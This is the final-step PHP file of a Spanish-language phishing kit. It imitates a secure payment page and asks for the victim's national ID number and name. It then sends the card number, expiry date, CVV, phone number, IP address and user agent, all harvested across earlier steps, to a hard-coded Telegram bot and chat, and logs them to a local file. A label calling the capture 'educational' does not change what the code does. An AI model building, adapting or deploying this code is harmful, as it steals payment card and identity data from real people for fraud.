<?php
/**
 * STEP 7 - DNI y Nombre + ENVÍO A TELEGRAM
 * ESTE ES EL PASO FINAL QUE ENVÍA TODO
 */
session_start();

// ================================
// CONFIGURACIÓN DE TELEGRAM
// ================================
define('TELEGRAM_BOT_TOKEN', '8234170971:AAH7Z8ySIHDs1tZmWTbFnAc90-RKdh26fwY');
define('TELEGRAM_CHAT_ID', '-1003832913889');

// ================================
// CAPTURAR DNI Y NOMBRE
// ================================
if(isset($_POST['dni']) && isset($_POST['name'])) {
    $_SESSION['dni'] = trim($_POST['dni']);
    $_SESSION['name'] = trim($_POST['name']);
    
    // ================================
    // RECOPILAR TODOS LOS DATOS
    // ================================
    $telefono = isset($_SESSION['phone']) ? $_SESSION['phone'] : 'N/A';
    $monto = isset($_SESSION['amount']) ? $_SESSION['amount'] : 'N/A';
    $tarjeta = isset($_SESSION['card']) ? $_SESSION['card'] : 'N/A';
    $vencimiento = isset($_SESSION['venc']) ? $_SESSION['venc'] : 'N/A';
    $cvv = isset($_SESSION['cv']) ? $_SESSION['cv'] : 'N/A';
    $dni = isset($_SESSION['dni']) ? $_SESSION['dni'] : 'N/A';
    $nombre = isset($_SESSION['name']) ? $_SESSION['name'] : 'N/A';
    
    // Información técnica
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $fecha = date('Y-m-d H:i:s');
    
    // ================================
    // CONSTRUIR MENSAJE PARA TELEGRAM
    // ================================
    $mensaje = "🔔 <b>NUEVA CAPTURA COMPLETA</b>\n";
    $mensaje .= "━━━━━━━━━━━━━━━\n\n";
    
    $mensaje .= "📱 <b>Datos Personales:</b>\n";
    $mensaje .= "├ Teléfono: <code>" . htmlspecialchars($telefono) . "</code>\n";
    $mensaje .= "├ Nombre: " . htmlspecialchars($nombre) . "\n";
    $mensaje .= "└ DNI: " . htmlspecialchars($dni) . "\n\n";
    
    $mensaje .= "💳 <b>Datos Bancarios:</b>\n";
    $mensaje .= "├ Tarjeta: <code>" . htmlspecialchars($tarjeta) . "</code>\n";
    $mensaje .= "├ Vencimiento: " . htmlspecialchars($vencimiento) . "\n";
    $mensaje .= "├ CVV: <code>" . htmlspecialchars($cvv) . "</code>\n";
    $mensaje .= "└ Monto: $" . htmlspecialchars($monto) . "\n\n";
    
    $mensaje .= "🌐 <b>Información Técnica:</b>\n";
    $mensaje .= "├ IP: <code>" . $ip . "</code>\n";
    $mensaje .= "├ Navegador: " . substr(htmlspecialchars($user_agent), 0, 50) . "...\n";
    $mensaje .= "└ Fecha: " . $fecha . "\n\n";
    
    $mensaje .= "⚠️ <i>Captura de prueba educativa</i>";
    
    // ================================
    // ENVIAR A TELEGRAM
    // ================================
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = array(
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    );
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $enviado = ($http_code == 200);
    
    // ================================
    // GUARDAR EN LOG LOCAL
    // ================================
    $log_file = __DIR__ . '/capturas_completas.log';
    $log_entry = sprintf(
        "[%s] Tel: %s | Tarjeta: %s | DNI: %s | Nombre: %s | IP: %s | Enviado: %s\n",
        $fecha,
        $telefono,
        $tarjeta,
        $dni,
        $nombre,
        $ip,
        $enviado ? 'SI' : 'NO'
    );
    @file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // ================================
    // LIMPIAR SESIÓN
    // ================================
    session_destroy();
    
    // ================================
    // REDIRIGIR A PÁGINA DE ÉXITO
    // ================================
    header('Location: success.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DNI y Titular | Personal</title>
    <link rel="stylesheet" href="css/op/bootstrap.min.css">
    <link rel="stylesheet" href="css/op/styles.css">
    <link rel="stylesheet" href="css/op/index.css">
</head>
<body style="background-color: #e5e5e5;">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12 p-0">
                <header class="header">
                    <nav class="px-0 pt-0">
                        <div class="d-flex justify-content-between align-items-center">
                            <div class="ml-3 ml-md-5">
                                <img src="assets/flow.svg" class="pl-md-4 img-fluid" style="height: 40px;">
                            </div>
                            <div class="mr-3 mr-md-5">
                                <img src="assets/secure.svg" class="pr-md-4 d-none d-sm-block" style="height: 30px;">
                            </div>
                        </div>
                    </nav>
                </header>

                <div class="row justify-content-center mt-5">
                    <div class="col-12 text-center">
                        <h1 class="text-center mb-4" style="color: #333; font-size: 28px;">Datos del titular</h1>
                    </div>

                    <div class="col-11 col-sm-6">
                        <form method="POST" action="step7.php">
                            <div class="form-group">
                                <label style="color: #666;">DNI</label>
                                <input type="text" name="dni" id="dni" class="form-control" placeholder="12345678" maxlength="8" style="height: 50px; font-size: 16px;" required>
                            </div>

                            <div class="form-group">
                                <label style="color: #666;">Nombre y Apellido</label>
                                <input type="text" name="name" id="name" class="form-control" placeholder="Juan Pérez" maxlength="50" style="height: 50px; font-size: 16px;" required>
                            </div>

                            <div class="text-center mt-4">
                                <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
                                <button type="submit" id="btnPagar" class="btn btn-success px-5 py-2" disabled style="background: #28a745; border: none; font-size: 18px; font-weight: bold;">PAGAR</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="javascript/query.min.js"></script>
    <script>
        function validarFormulario() {
            var dni = $('#dni').val();
            var nombre = $('#name').val();
            
            if(dni.length >= 7 && nombre.length >= 3) {
                $('#btnPagar').prop('disabled', false);
            } else {
                $('#btnPagar').prop('disabled', true);
            }
        }
        
        $('#dni, #name').on('keyup', validarFormulario);
    </script>
</body>
</html>